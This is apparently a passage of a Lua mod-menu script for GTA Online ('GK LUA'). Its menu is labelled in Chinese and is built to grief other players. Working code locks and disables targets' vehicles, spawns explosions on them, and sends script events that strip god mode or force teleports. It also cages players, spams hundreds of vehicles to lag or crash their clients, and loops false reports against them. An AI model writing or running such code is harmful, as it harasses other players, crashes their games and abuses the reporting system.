		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, false)
		notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.green)
		--util.yield(15000)
		--entities.delete_by_handle(ped)
		--notification("Deleted [" .. ped_name .. "]", true, false)
	end




	main = menu.list(menu.player_root(pid), "GK 恶搞", {}, "", function(); end)
	
	lock_sub_vehicle_tab = menu.list(main, "车辆恶搞", {}, "", function(); end)

	
    menu.action(lock_sub_vehicle_tab,"锁门", {"lockveh"}, "Locks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"解锁", {"unlockveh"}, "Unlocks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"使车辆可用", {"engineon"}, "Makes player's vehicle drivable again",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"使车辆不可用", {"engineoff"}, "Makes player's vehicle undrivable",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
	end)
	
	griefing = menu.list(main, "整他", {}, "", function(); end)
	
	
	classlc = menu.list(griefing, "经典", {}, "", function(); end)
	
	
	menu.toggle_loop(classlc, "喷水", {""}, "", function(on_click)
	        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)

    end)
	
	
	menu.toggle_loop(classlc, "喷火", {""}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)

    end)
	menu.action(griefing, "关闭玩家无敌模式", {}, "关闭玩家无敌模式", function()
	            if players.exists(pid) then
				send_script_event(-1388926377, pid, {pid, 1})
				send_script_event(-1388926377, pid, {pid, 1})
            end
		end)
	
	
	
	menu.action(griefing, "上岛", {}, "send to iland", function()
		if players.exists(pid) then
			send_script_event(1361475530, pid, {pid, 0})
		end
    end)
	
	menu.action(griefing, "拉仓库", {}, "", function()
		if players.exists(pid) then
			send_script_event(2130458390, pid, {pid, 0})
		end
    end)
	
	
	menu.action(griefing, "阻止被动", {}, "", function()
		if players.exists(pid) then
			send_script_event(13680555548, pid, {pid, 0})
		end
    end)

	cage_options = menu.list(griefing, "笼子", {}, "")

	menu.divider(cage_options, "笼子")

	menu.action(cage_options, "笼子", {"cage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("Failed to kick player out of the vehicle", colors.red)
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
	end)
---------------------------------------------------------------------------------------------------------------------------------
	
	menu.action(cage_options, "餐车", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)

		--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		--rot.y = 90
		--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
menu.action(cage_options, "狗笼", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "圣诞快乐", {"jollycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "圣诞快乐2.0", {"jollycage2"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "圣诞快乐3.0", {"jollycage3"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "安全空间", {"safecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "垃圾桶", {"trashcage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.action(cage_options, "钱笼子", {"moneycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)


----------------------------------------------------------------------------------------------------------------------------------







	menu.action(cage_options, "特技管", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "新世纪全自动化套笼", {"autocage"}, "", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("Failed to kick player out of the vehicle", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --current position
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again", colors.black)
				::continue::
			end
			util.yield(1000)
		end
	end)






	menu.action(cage_options, "删掉笼子", {"release"}, "", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)
	
	pan = menu.list(griefing, "炸鱼", {}, "")
	 Ptools_PanTable = {}
    Ptools_PanCount = 1
    Ptools_FishPan = 20
	menu.action(pan, "炸鱼", {}, "", function()
	menu.trigger_commands("anticrashcam on")
	 local targetped = PLAYER.GET_PLAYER_PED(pid)
        local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)

        local hash = util.joaat("tug")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end

        for i = 1, Ptools_FishPan do
            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
            ----
            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
            ----
            if SE_Notifications then
                util.toast("Spawned with index of " .. Ptools_PanCount)
            end
            Ptools_PanCount = Ptools_PanCount + 1
        end
    end)

    --preload

    menu.slider(pan, "鱼", {"friedfish"}, "The number of flippity flops", 1, 300, 20, 1, function(value)
        Ptools_FishPan = value
    end)

    menu.action(pan, "移除", {"rmpan"}, "Yep", function ()
        for x = 1, 5, 1 do
            for i = 1, #Ptools_PanTable do
                entities.delete_by_handle(Ptools_PanTable[i])
                util.yield(10)
            end
        end
        --
        Ptools_PanCount = 1
        Ptools_PanTable = {}
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
		util.yield(800)
		menu.trigger_commands("anticrashcam off")
    end)
	
	

	menu.action(griefing,"刷飞机", {}, "很卡，有概率崩掉对方", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("Started lagging the fuck out of him", colors.black)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("Done", colors.green) -- cpu burned congrats
		menu.trigger_commands("anticrashcamera off")
	end)


	menu.action(griefing,"拉走", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

        end
	end)



	menu.toggle(griefing,"循环举报", {}, "会变卡", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)



-----------------------------------------------------------------------------------------------------------------------------------------
-- gotta give adequate space for these super op lua crashes

	crashes = menu.list(main, "cpu", {}, "艹烂它的cpu", function(); end)


    menu.action(crashes,"CPU", {}, "DDD", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		menu.trigger_commands("anticrashcamera off")
	end)
end
    





-----------------------------------------------------------------------------------------------------------------------------------------









notification("欢迎使用GK LUA", colors.pink)





local InitialPlayersList = players.list(true, true, true) -- Obtain list of players from Stand API
for i=1, #InitialPlayersList do -- Loop1 through the received player list
	GenerateFeatures(InitialPlayersList[i]) -- Generate Features for every player
end
InitialPlayersList = nil -- Discard the table as it is no longer needed (optional; most beginners will not do this)

players.on_join(function(pid)
	while true do
		if joining then
			notification(PLAYER.GET_PLAYER_NAME(pid) .. " joined", colors.black)
		end
		util.yield()
	end
end)

players.on_join(GenerateFeatures)
--players.on_leave(update_leave)
--players.on_join(update_join)
--util.on_stop(cleanup)



local last_call_time = util.current_time_millis()
local redo_boost = false


-- object ghosting
util.create_thread(function()
	while true do
		if objectghosting then
			local PlayerPed = PLAYER.GET_PLAYER_PED(players.user())
			local PedVehicle = PED.GET_VEHICLE_PED_IS_USING(PlayerPed)
			if PED.IS_PED_IN_ANY_VEHICLE(PlayerPed) then
				local collision = entities.get_all_objects_as_handles()
				for i = 1, #collision do
					ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(collision[i], PedVehicle, false)
					ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(PedVehicle, collision[i], false)    -- unfortunately theres no way to force collision to reenable afaik so you just have to wait it out and travel to a new area which loads new objects
				end
			end
		end
	util.yield(500)
	end
end)






util.on_stop(function()
    util.show_corner_help("~r~脚本已关闭~s~ ‹ ~o~ " .. SCRIPT_FILENAME .. "\n~s~再次感谢 ~p~:)")
	notification("lua已关闭，感谢使用", colors.blue)
end)	